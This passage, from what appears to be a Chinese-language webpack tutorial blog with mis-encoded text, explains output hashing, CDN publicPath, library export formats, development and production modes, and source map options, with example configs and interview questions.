class="hljs-string">&#x27;https://child-app.com/entry.js&#x27;</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>ç»“åˆModule Federationå®ç°</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// åŠ¨æ€é…ç½®remotes</span><br><span class="hljs-attr">remotes</span>: &#123;<br>  <span class="hljs-attr">childApp</span>: <span class="hljs-string">`promise import(&#x27;child_app/entry.js&#x27;)`</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="1-2-2-outputï¼šæ–‡ä»¶åå“ˆå¸Œã€CDNè·¯å¾„ã€Libraryå¯¼å‡º"><a href="#1-2-2-outputï¼šæ–‡ä»¶åå“ˆå¸Œã€CDNè·¯å¾„ã€Libraryå¯¼å‡º" class="headerlink" title="1.2.2 outputï¼šæ–‡ä»¶åå“ˆå¸Œã€CDNè·¯å¾„ã€Libraryå¯¼å‡º"></a>1.2.2 <code>output</code>ï¼šæ–‡ä»¶åå“ˆå¸Œã€CDNè·¯å¾„ã€Libraryå¯¼å‡º</h3><p><strong>Output é…ç½®æ ¸å¿ƒæ¦‚å¿µ</strong></p><p>åŸºæœ¬ä½œç”¨ä¸ç»“æ„ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">output</span>: &#123;<br>    <span class="hljs-attr">path</span>: path.<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">&#x27;dist&#x27;</span>), <span class="hljs-comment">// è¾“å‡ºç›®å½•</span><br>    <span class="hljs-attr">filename</span>: <span class="hljs-string">&#x27;[name].[contenthash].js&#x27;</span>,  <span class="hljs-comment">// æ–‡ä»¶åæ¨¡æ¿</span><br>    <span class="hljs-attr">publicPath</span>: <span class="hljs-string">&#x27;https://cdn.example.com/&#x27;</span>, <span class="hljs-comment">// CDNè·¯å¾„</span><br>    <span class="hljs-attr">library</span>: <span class="hljs-string">&#x27;MyLibrary&#x27;</span>, <span class="hljs-comment">// åº“å¯¼å‡ºåç§°</span><br>    <span class="hljs-attr">libraryTarget</span>: <span class="hljs-string">&#x27;umd&#x27;</span> <span class="hljs-comment">// å¯¼å‡ºæ ¼å¼</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>æ–‡ä»¶åå“ˆå¸Œç­–ç•¥</strong></p><table><thead><tr><th align="left">å“ˆå¸Œç±»å‹</th><th align="left">è®¡ç®—ä¾æ®</th><th align="left">é€‚ç”¨åœºæ™¯</th><th align="left">ç¤ºä¾‹</th></tr></thead><tbody><tr><td align="left">[hash]</td><td align="left">æ•´ä¸ªé¡¹ç›®æ„å»º</td><td align="left">æ‰€æœ‰è¾“å‡ºæ–‡ä»¶ç›¸åŒå“ˆå¸Œ</td><td align="left">main.3a7f8e9.js</td></tr><tr><td align="left">[chunkhash]</td><td align="left">æ¯ä¸ªå…¥å£chunkå†…å®¹</td><td align="left">ç‹¬ç«‹æ›´æ–°çš„chunk</td><td align="left">app.4c2d8b1.js</td></tr><tr><td align="left">[contenthash]</td><td align="left">æ–‡ä»¶å®é™…å†…å®¹</td><td align="left">æœ€ä½³ç¼“å­˜ç­–ç•¥</td><td align="left">styles.5e6f7a2.css</td></tr><tr><td align="left">[fullhash]</td><td align="left">æ•´ä¸ªç¼–è¯‘è¿‡ç¨‹</td><td align="left">Webpack 5+ æ›¿ä»£[hash]</td><td align="left">vendor.9b0c3d4.js</td></tr></tbody></table><p>å“ˆå¸Œå¤±æ•ˆé—®é¢˜è§£å†³æ–¹æ¡ˆ</p><ul><li>é—®é¢˜ï¼šæ¨¡å—æœªå˜æ›´ä½†å“ˆå¸Œå˜åŒ–</li><li>åŸå› ï¼šWebpackå¼•å¯¼ä»£ç (manifest)å˜åŒ–</li><li>ä¿®å¤ï¼šæå–runtimeåˆ°å•ç‹¬æ–‡ä»¶</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-attr">optimization</span>: &#123;<br>  <span class="hljs-attr">runtimeChunk</span>: &#123;<br>    <span class="hljs-attr">name</span>: <span class="hljs-function"><span class="hljs-params">entrypoint</span> =&gt;</span> <span class="hljs-string">`runtime-<span class="hljs-subst">$&#123;entrypoint.name&#125;</span>`</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>CDNè·¯å¾„é…ç½®ç­–ç•¥</strong></p><p>(1) publicPath åŠ¨æ€é…ç½®</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// æ ¹æ®ç¯å¢ƒåˆ‡æ¢è·¯å¾„</span><br><span class="hljs-attr">output</span>: &#123;<br>  <span class="hljs-attr">publicPath</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">NODE_ENV</span> === <span class="hljs-string">&#x27;production&#x27;</span><br>    ? <span class="hljs-string">&#x27;https://cdn.example.com/assets/&#x27;</span><br>    : <span class="hljs-string">&#x27;/&#x27;</span><br>&#125;<br><br><span class="hljs-comment">// è‡ªåŠ¨æ£€æµ‹åè®®</span><br><span class="hljs-attr">publicPath</span>: <span class="hljs-string">&#x27;//cdn.example.com/assets/&#x27;</span><br></code></pre></td></tr></table></figure><p>(2) å¾®å‰ç«¯åœºæ™¯ä¸‹çš„ CDN é…ç½®</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ä¸»åº”ç”¨é…ç½®</span><br><span class="hljs-attr">output</span>: &#123;<br>  <span class="hljs-attr">publicPath</span>: <span class="hljs-string">&#x27;https://main-app.com/&#x27;</span><br>&#125;<br><br><span class="hljs-comment">// å­åº”ç”¨é…ç½®</span><br><span class="hljs-attr">output</span>: &#123;<br>  <span class="hljs-attr">publicPath</span>: <span class="hljs-string">&#x27;https://child-app.com/assets/&#x27;</span>,<br>  <span class="hljs-comment">// Webpack 5 Module Federation</span><br>  <span class="hljs-attr">uniqueName</span>: <span class="hljs-string">&#x27;childApp&#x27;</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Library å¯¼å‡ºé…ç½®</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-attr">output</span>: &#123;<br>  <span class="hljs-attr">library</span>: &#123;<br>    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;MyLibrary&#x27;</span>,<br>    <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;umd&#x27;</span>,<br>    <span class="hljs-attr">export</span>: <span class="hljs-string">&#x27;default&#x27;</span> <span class="hljs-comment">// å¯¼å‡ºé»˜è®¤å€¼</span><br>  &#125;,<br>  <span class="hljs-attr">globalObject</span>: <span class="hljs-string">&#x27;this&#x27;</span> <span class="hljs-comment">// å…¼å®¹Nodeå’Œæµè§ˆå™¨</span><br>&#125;<br></code></pre></td></tr></table></figure><p>å¯¼å‡ºæ ¼å¼å¯¹æ¯”ï¼š</p><table><thead><tr><th align="left">æ ¼å¼ç±»å‹</th><th align="left">ä½¿ç”¨åœºæ™¯</th><th align="left">ç¤ºä¾‹è¾“å‡º</th><th align="left">è¿è¡Œç¯å¢ƒ</th></tr></thead><tbody><tr><td align="left">var</td><td align="left">å…¨å±€å˜é‡</td><td align="left"><code>var MyLib = ...</code></td><td align="left">æµè§ˆå™¨</td></tr><tr><td align="left">this</td><td align="left">å½“å‰ä¸Šä¸‹æ–‡</td><td align="left"><code>this[&quot;MyLib&quot;] = ...</code></td><td align="left">æµè§ˆå™¨&#x2F;Node</td></tr><tr><td align="left">commonjs</td><td align="left">CommonJSç¯å¢ƒ</td><td align="left"><code>exports[&quot;MyLib&quot;] = ...</code></td><td align="left">Node</td></tr><tr><td align="left">amd</td><td align="left">AMDæ¨¡å—</td><td align="left"><code>define(&quot;MyLib&quot;, [], ...)</code></td><td align="left">RequireJS</td></tr><tr><td align="left">umd</td><td align="left">é€šç”¨æ¨¡å—å®šä¹‰</td><td align="left">å…¼å®¹AMD&#x2F;CJS&#x2F;å…¨å±€å˜é‡</td><td align="left">è·¨ç¯å¢ƒ</td></tr><tr><td align="left">system</td><td align="left">SystemJSæ¨¡å—</td><td align="left"><code>System.register(&quot;MyLib&quot;, ...)</code></td><td align="left">SystemJS</td></tr></tbody></table><p>å¤šå…¥å£åº“å¯¼å‡ºç¤ºä¾‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-attr">entry</span>: &#123;<br>  <span class="hljs-attr">main</span>: <span class="hljs-string">&#x27;./src/index.js&#x27;</span>,<br>  <span class="hljs-attr">utils</span>: <span class="hljs-string">&#x27;./src/utils.js&#x27;</span><br>&#125;,<br><span class="hljs-attr">output</span>: &#123;<br>  <span class="hljs-attr">filename</span>: <span class="hljs-string">&#x27;[name].js&#x27;</span>,<br>  <span class="hljs-attr">library</span>: &#123;<br>    <span class="hljs-attr">name</span>: [<span class="hljs-string">&#x27;MyLib&#x27;</span>, <span class="hljs-string">&#x27;[name]&#x27;</span>], <span class="hljs-comment">// MyLib.main, MyLib.utils</span><br>    <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;umd&#x27;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>æ€§èƒ½ä¼˜åŒ–å®è·µ</strong></p><p>(1) å“ˆå¸Œç®—æ³•ä¼˜åŒ–ï¼ˆWebpack 5+ï¼‰</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-attr">output</span>: &#123;<br>  <span class="hljs-attr">hashFunction</span>: <span class="hljs-string">&#x27;xxhash64&#x27;</span>, <span class="hljs-comment">// æ¯”md4æ›´å¿«</span><br>  <span class="hljs-attr">hashDigestLength</span>: <span class="hljs-number">12</span> <span class="hljs-comment">// æ›´é•¿çš„å“ˆå¸Œå‡å°‘ç¢°æ’</span><br>&#125;<br></code></pre></td></tr></table></figure><p>(2) CDN åŸŸååˆ†æ•£</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ä½¿ç”¨å¤šä¸ªCDNåŸŸååŠ é€Ÿèµ„æºåŠ è½½</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">getCDNPath</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> cdns = [<br>    <span class="hljs-string">&#x27;https://cdn1.example.com&#x27;</span>,<br>    <span class="hljs-string">&#x27;https://cdn2.example.com&#x27;</span><br>  ];<br>  <span class="hljs-keyword">return</span> cdns[<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * cdns.<span class="hljs-property">length</span>)];<br>&#125;<br><br><span class="hljs-attr">output</span>: &#123;<br>  <span class="hljs-attr">publicPath</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">NODE_ENV</span> === <span class="hljs-string">&#x27;production&#x27;</span> <br>    ? <span class="hljs-title function_">getCDNPath</span>() <br>    : <span class="hljs-string">&#x27;/&#x27;</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>å¸¸è§é—®é¢˜è§£å†³æ–¹æ¡ˆ</strong></p><p>(1) è·¯å¾„é”™è¯¯é—®é¢˜</p><ul><li>ç—‡çŠ¶ï¼šError: Cannot find module â€˜.&#x2F;main.jsâ€™</li><li>åŸå› ï¼špublicPathé…ç½®é”™è¯¯</li></ul><p>(2) åº“å¯¼å‡ºå†²çª</p><ul><li>ç—‡çŠ¶ï¼šå¤šåº“å…±å­˜æ—¶å…¨å±€å˜é‡è¦†ç›–</li><li>è§£å†³æ–¹æ¡ˆï¼šä½œç”¨åŸŸéš”ç¦»</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-attr">output</span>: &#123;<br>  <span class="hljs-attr">library</span>: &#123;<br>    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;MyLib&#x27;</span>,<br>    <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;var&#x27;</span>,<br>    <span class="hljs-attr">umdNamedDefine</span>: <span class="hljs-literal">true</span> <span class="hljs-comment">// æ·»åŠ å‘½åç©ºé—´</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>é¢è¯•é‡ç‚¹è§£æ</strong></p><p>(1) contenthash&#x2F;chunkhash&#x2F;hashçš„åŒºåˆ«ï¼Ÿ</p><ul><li>hashï¼šåŸºäºæ•´ä¸ªcompilationç”Ÿæˆï¼Œæ‰€æœ‰æ–‡ä»¶å…±äº«</li><li>chunkhashï¼šåŸºäºå…¥å£chunkå†…å®¹</li><li>contenthashï¼šåŸºäºæ–‡ä»¶å†…å®¹ï¼ˆæœ€ä½³ç¼“å­˜ç­–ç•¥ï¼‰</li><li>ä½¿ç”¨åœºæ™¯ï¼š<ul><li>CSSæ–‡ä»¶åº”ä½¿ç”¨[contenthash]</li><li>å…¥å£JSä½¿ç”¨[chunkhash]</li><li>é¿å…ä½¿ç”¨[hash]</li></ul></li></ul><p>(2) å¦‚ä½•å®ç°æ°¸ä¹…ç¼“å­˜ï¼Ÿ</p><ul><li>ä½¿ç”¨[contenthash]ä½œä¸ºæ–‡ä»¶å</li><li>æå–runtimeåˆ°å•ç‹¬æ–‡ä»¶</li><li>ç¨³å®šæ¨¡å—IDï¼ˆoptimization.moduleIds: â€˜deterministicâ€™ï¼‰</li><li>é¿å…å†…è”webpackè¿è¡Œæ—¶ä»£ç </li></ul><p>(3) UMDåº“å¦‚ä½•å…¼å®¹ä¸åŒç¯å¢ƒï¼Ÿ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-attr">output</span>: &#123;<br>  <span class="hljs-attr">library</span>: &#123;<br>    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;MyLib&#x27;</span>,<br>    <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;umd&#x27;</span><br>  &#125;,<br>  <span class="hljs-attr">globalObject</span>: <span class="hljs-string">&#x27;typeof self !== &quot;undefined&quot; ? self : this&#x27;</span> <span class="hljs-comment">// è‡ªåŠ¨æ£€æµ‹ç¯å¢ƒ</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="1-2-3-modeï¼šå¼€å‘-ç”Ÿäº§æ¨¡å¼å†…ç½®ä¼˜åŒ–"><a href="#1-2-3-modeï¼šå¼€å‘-ç”Ÿäº§æ¨¡å¼å†…ç½®ä¼˜åŒ–" class="headerlink" title="1.2.3 modeï¼šå¼€å‘&#x2F;ç”Ÿäº§æ¨¡å¼å†…ç½®ä¼˜åŒ–"></a>1.2.3 <code>mode</code>ï¼šå¼€å‘&#x2F;ç”Ÿäº§æ¨¡å¼å†…ç½®ä¼˜åŒ–</h3><p><strong>mode é…ç½®çš„æ ¸å¿ƒä½œç”¨</strong></p><p>æ¨¡å¼å®šä¹‰ä¸é»˜è®¤è¡Œä¸ºï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">mode</span>: <span class="hljs-string">&#x27;development&#x27;</span>, <span class="hljs-comment">// å¯é€‰ï¼š&#x27;development&#x27; | &#x27;production&#x27; | &#x27;none&#x27;</span><br>&#125;<br></code></pre></td></tr></table></figure><table><thead><tr><th align="left">æ¨¡å¼</th><th align="left">é»˜è®¤è¡Œä¸ºæ¦‚è§ˆ</th><th align="left">é€‚ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td align="left">development</td><td align="left">ä¼˜åŒ–å¼€å‘ä½“éªŒ</td><td align="left">æœ¬åœ°å¼€å‘</td></tr><tr><td align="left">production</td><td align="left">ä¼˜åŒ–è¾“å‡ºæ–‡ä»¶ä½“ç§¯å’Œæ€§èƒ½</td><td align="left">ç”Ÿäº§éƒ¨ç½²</td></tr><tr><td align="left">none</td><td align="left">ä¸å¯ç”¨ä»»ä½•é»˜è®¤ä¼˜åŒ–</td><td align="left">è‡ªå®šä¹‰é…ç½®</td></tr></tbody></table><p><strong>å¼€å‘æ¨¡å¼(development)æ·±åº¦è§£æ</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// mode: &#x27;development&#x27; ç­‰æ•ˆäºä»¥ä¸‹é…ç½®</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">devtool</span>: <span class="hljs-string">&#x27;eval-cheap-module-source-map&#x27;</span>, <span class="hljs-comment">// æºæ˜ å°„(Source Map)</span><br>  <span class="hljs-attr">optimization</span>: &#123;<br>    <span class="hljs-attr">minimize</span>: <span class="hljs-literal">false</span>, <span class="hljs-comment">// ç¦ç”¨å‹ç¼©/ä¼˜åŒ–</span><br>    <span class="hljs-attr">removeAvailableModules</span>: <span class="hljs-literal">false</span>, <span class="hljs-comment">// ä¿ç•™å˜é‡å/æ³¨é‡Š</span><br>    <span class="hljs-attr">removeEmptyChunks</span>: <span class="hljs-literal">false</span>, <span class="hljs-comment">// ä¿ç•™å˜é‡å/æ³¨é‡Š</span><br>    <span class="hljs-attr">splitChunks</span>: <span class="hljs-literal">false</span>,<br>  &#125;,<br>  <span class="hljs-attr">plugins</span>: [<br>    <span class="hljs-keyword">new</span> webpack.<span class="hljs-title class_">HotModuleReplacementPlugin</span>() <span class="hljs-comment">// çƒ­æ¨¡å—æ›¿æ¢(HMR)</span><br>  ]<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>ç”Ÿäº§æ¨¡å¼(production)æ·±åº¦ä¼˜åŒ–</strong></p><p>å†…ç½®ä¼˜åŒ–æ¸…å•ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ç”Ÿäº§æ¨¡å¼ç­‰æ•ˆé…ç½®</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">optimization</span>: &#123;<br>    <span class="hljs-attr">minimize</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// å¯ç”¨Terserå‹ç¼©</span><br>    <span class="hljs-attr">minimizer</span>: [<span class="hljs-keyword">new</span> <span class="hljs-title class_">TerserPlugin</span>()], <br>    <span class="hljs-attr">splitChunks</span>: &#123; <span class="hljs-attr">chunks</span>: <span class="hljs-string">&#x27;all&#x27;</span> &#125;, <span class="hljs-comment">// ä»£ç åˆ†å‰²</span><br>    <span class="hljs-attr">concatenateModules</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// æ¨¡å—ä¸²è”</span><br>    <span class="hljs-attr">flagIncludedChunks</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// æ ‡è®°åŒ…å«çš„chunks</span><br>    <span class="hljs-attr">sideEffects</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// å¯ç”¨Tree Shaking</span><br>    <span class="hljs-attr">providedExports</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// åˆ†æå¯¼å‡º</span><br>    <span class="hljs-attr">usedExports</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// æ ‡è®°ä½¿ç”¨å¯¼å‡º</span><br>  &#125;,<br>  <span class="hljs-attr">performance</span>: &#123;<br>    <span class="hljs-attr">hints</span>: <span class="hljs-string">&#x27;warning&#x27;</span>, <span class="hljs-comment">// æ€§èƒ½æç¤º</span><br>    <span class="hljs-attr">maxAssetSize</span>: <span class="hljs-number">250000</span>, <span class="hljs-comment">// èµ„æºå¤§å°é˜ˆå€¼</span><br>    <span class="hljs-attr">maxEntrypointSize</span>: <span class="hljs-number">250000</span> <span class="hljs-comment">// å…¥å£å¤§å°é˜ˆå€¼</span><br>  &#125;,<br>  <span class="hljs-attr">plugins</span>: [<br>    <span class="hljs-keyword">new</span> webpack.<span class="hljs-title class_">DefinePlugin</span>(&#123; <br>      <span class="hljs-string">&#x27;process.env.NODE_ENV&#x27;</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(<span class="hljs-string">&#x27;production&#x27;</span>) <br>    &#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">CssMinimizerPlugin</span>() <span class="hljs-comment">// CSSå‹ç¼©</span><br>  ]<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>é«˜çº§æ¨¡å¼é…ç½®æŠ€å·§</strong></p><p>(1) å¤šç¯å¢ƒé…ç½®ç®¡ç†</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// webpack.config.js</span><br><span class="hljs-keyword">const</span> configs = &#123;<br>  <span class="hljs-attr">development</span>: <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./webpack.dev.config&#x27;</span>),<br>  <span class="hljs-attr">production</span>: <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./webpack.prod.config&#x27;</span>),<br>  <span class="hljs-attr">staging</span>: <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./webpack.staging.config&#x27;</span>)<br>&#125;;<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-function">(<span class="hljs-params">env</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">return</span> configs[env.<span class="hljs-property">mode</span> || <span class="hljs-string">&#x27;development&#x27;</span>];<br>&#125;<br></code></pre></td></tr></table></figure><p>(2) æ¨¡å¼æ‰©å±•é…ç½®</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// æ‰©å±•ç”Ÿäº§æ¨¡å¼ä¼˜åŒ–</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">mode</span>: <span class="hljs-string">&#x27;production&#x27;</span>,<br>  <span class="hljs-attr">optimization</span>: &#123;<br>    <span class="hljs-comment">// ä¿ç•™åŸå§‹é…ç½®å¹¶æ·»åŠ é¢å¤–ä¼˜åŒ–</span><br>    ...webpack.<span class="hljs-property">optimization</span>,<br>    <span class="hljs-attr">minimize</span>: <span class="hljs-literal">true</span>,<br>    <span class="hljs-attr">minimizer</span>: [<br>      <span class="hljs-keyword">new</span> <span class="hljs-title class_">TerserPlugin</span>(&#123;<br>        <span class="hljs-attr">parallel</span>: <span class="hljs-literal">true</span>,<br>        <span class="hljs-attr">terserOptions</span>: &#123;<br>          <span class="hljs-attr">compress</span>: &#123; <span class="hljs-attr">drop_console</span>: <span class="hljs-literal">true</span> &#125; <span class="hljs-comment">// ç§»é™¤console</span><br>        &#125;<br>      &#125;)<br>    ]<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>é¢è¯•é‡ç‚¹è§£æ</strong></p><p>(1) modeé…ç½®å…·ä½“åšäº†å“ªäº›ä¼˜åŒ–ï¼Ÿ</p><ul><li><p>å¼€å‘æ¨¡å¼ï¼š</p><ul><li>å¯ç”¨å‘½åæ¨¡å—IDï¼ˆéæ•°å­—IDï¼‰</li><li>ä¿ç•™å˜é‡åå’Œä»£ç æ ¼å¼</li><li>å¯ç”¨eval-source-map</li><li>æ·»åŠ HMRæ”¯æŒ</li></ul></li><li><p>ç”Ÿäº§æ¨¡å¼ï¼š</p><ul><li>å¯ç”¨Terserä»£ç å‹ç¼©</li><li>å¼€å¯Tree Shaking</li><li>å¯ç”¨ä½œç”¨åŸŸæå‡(Scope Hoisting)</li><li>è®¾ç½®process.env.NODE_ENVä¸ºproduction</li><li>å¯ç”¨æ€§èƒ½æç¤º</li></ul></li></ul><p>(2) å¦‚ä½•éªŒè¯Tree Shakingç”Ÿæ•ˆï¼Ÿ</p><p>éªŒè¯æ­¥éª¤ï¼š</p><ol><li>ç¡®ä¿ä½¿ç”¨ç”Ÿäº§æ¨¡å¼ï¼šmode: â€˜productionâ€™</li><li>æ£€æŸ¥å¯¼å‡ºçš„åŒ…ä¸­æ˜¯å¦åŒ…å«æœªä½¿ç”¨çš„ä»£ç </li><li>ä½¿ç”¨webpack-bundle-analyzerå¯è§†åŒ–åˆ†æ</li><li>åœ¨package.jsonä¸­æ·»åŠ â€sideEffectsâ€: false</li></ol><p>(3) ä¸ºä»€ä¹ˆç”Ÿäº§ç¯å¢ƒéœ€è¦ä¸åŒçš„Source Mapï¼Ÿ</p><p>å®‰å…¨ä¸æ€§èƒ½å¹³è¡¡ï¼š</p><ul><li>hidden-source-mapï¼šç”Ÿæˆmapæ–‡ä»¶ä½†ä¸å…³è”</li><li>nosources-source-mapï¼šæ˜¾ç¤ºè¡Œå·ä½†ä¸æš´éœ²æºç </li><li>æœ€ä½³å®è·µï¼š</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-attr">devtool</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">SENTRY_URL</span> <br>  ? <span class="hljs-string">&#x27;source-map&#x27;</span> <span class="hljs-comment">// é”™è¯¯ç›‘æ§éœ€è¦å®Œæ•´sourcemap</span><br>  : <span class="hljs-string">&#x27;hidden-source-map&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="1-2-4-devtoolï¼šSource-MapåŸç†ä¸é€‰å‹"><a href="#1-2-4-devtoolï¼šSource-MapåŸç†ä¸é€‰å‹" class="headerlink" title="1.2.4 devtoolï¼šSource MapåŸç†ä¸é€‰å‹"></a>1.2.4 <code>devtool</code>ï¼šSource MapåŸç†ä¸é€‰å‹</h3><p><strong>Source Map æ 